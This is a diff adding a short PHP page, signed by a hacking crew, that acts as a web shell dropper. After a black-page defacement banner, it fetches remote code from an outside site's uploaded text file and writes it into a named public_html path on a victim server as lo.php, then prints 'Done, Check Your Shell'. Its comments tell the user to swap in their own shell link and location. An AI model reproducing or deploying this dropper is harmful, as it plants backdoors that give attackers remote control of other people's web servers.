@@ -1,0 +1,30 @@
+<STYLE>
+body {
+background-position:  center;
+background-repeat: no-repeat;
+background-color: #000000;
+background-attachment: fixed;
+}
+</STYLE>
+<table width=100% cellspacing=100 cellpadding=165><tr><td align=center><font color=white>
+with love from <a href="https://www.facebook.com/Pakhc">Team Pakistan Haxors Crew</a> and <a href="http://hasnainworld.com</a><br>
+<?php
+echo "CWD => ". getcwd();
+?>
+<br><br>
+<?php
+error_reporting(0);
+
+$li=file_get_contents("http://www.sarkaritel.com/uploads/images/3.txt");  //your 5h3ll code link here 
+$nf=fopen("/home/lugox/domains/lugoxmusic.com.ar/public_html/lo.php",'w');  //put your 5h3ll location with name like /home/user/public_html/5h3ll.php
+$yes=fwrite($nf,$li);
+if($yes)
+{
+echo "<br>Done, Check Your Shell  ";
+}
+else {
+echo "sorry :(";
+
+}
+
+?>
